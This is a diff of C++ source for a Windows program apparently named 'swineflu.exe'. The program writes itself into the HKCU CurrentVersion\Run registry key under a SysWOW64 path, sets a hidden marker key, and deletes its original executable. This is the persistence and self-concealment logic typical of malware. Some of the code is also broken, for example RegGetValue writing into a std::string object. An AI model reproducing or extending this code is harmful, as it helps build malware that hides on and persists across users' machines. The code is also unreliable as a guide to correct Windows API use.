@@ -26,25 +26,41 @@ string ExePath() {
 	return string(buffer).substr(0, pos);
 }
 
-void addRunEntry()
+void addStartUpEntry()
 {
 	RegSetKeyValue(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, REG_SZ, "C:\\Windows\\SysWOW64\\swineflu.exe", strlen("C:\\Windows\\SysWOW64\\swineflu.exe") + 1);
+}
 
+void firstTimeRunCheck()
+{
+	string str = ExePath();
+	printf(str.c_str());
+	str.append("\\swineflu.exe");
+
+	string swine_name = "swinef2";
+	
 	HKEY hKey = NULL;
 	DWORD rtime;
 
 	//Step 1: Open the key
-	long sts = RegOpenKeyEx(HKEY_CURRENT_USER, "swinef1", 0, KEY_READ, &hKey);
+	long sts = RegOpenKeyEx(HKEY_CURRENT_USER, "swinef2", 0, KEY_READ, &hKey);
 
 	//Step 2: If failed, create the key
 	if (ERROR_NO_MATCH == sts || ERROR_FILE_NOT_FOUND == sts)
 	{
-		cout << "Creating registry key " << "swinef1" << endl;
+		cout << "Creating registry key " << "swinef2" << endl;
 
-		long j = RegCreateKeyEx(HKEY_CURRENT_USER, "swinef1", 0L, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);
+		long j = RegCreateKeyEx(HKEY_CURRENT_USER, "swinef2", 0L, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);
+		
+		RegSetValueEx(hKey,             // subkey handle 
+			"BinxWhalton",        // value name 
+			0,                         // must be zero 
+			REG_EXPAND_SZ,             // value type 
+			(LPBYTE)str.c_str(),          // pointer to value data 
+			(DWORD)(lstrlen(str.c_str()) + 1)*sizeof(CHAR));
 
 		if (ERROR_SUCCESS != j)
-			cout << "Error: Could not create registry key " << "swinef1" << endl << "\tERROR: " << j << endl;
+			cout << "Error: Could not create registry key " << "swinef2" << endl << "\tERROR: " << j << endl;
 		else
 			cout << "Success: Key created" << endl;
 
@@ -52,9 +68,7 @@ void addRunEntry()
 
 		printf("created reg key");
 
-		string str = ExePath();
-		printf(str.c_str());
-		str.append("\\swineflu.exe");
+		
 
 		int unlucksic = _unlink(
 			str.c_str()
@@ -68,6 +82,9 @@ void addRunEntry()
 	else
 	{
 		printf("reg exists");
+		string recData;
+		RegGetValue(HKEY_CURRENT_USER, "swinef2", "BinxWhalton", RRF_RT_ANY, NULL, &recData, NULL);
+		printf(recData.c_str());
 	}
 }
 
@@ -92,11 +109,7 @@ void adminstartup()
 	}
 	else {
 		printf("okay\n");
-	}
-
-	addRunEntry();
-
-	
+	}	
 }
 
 
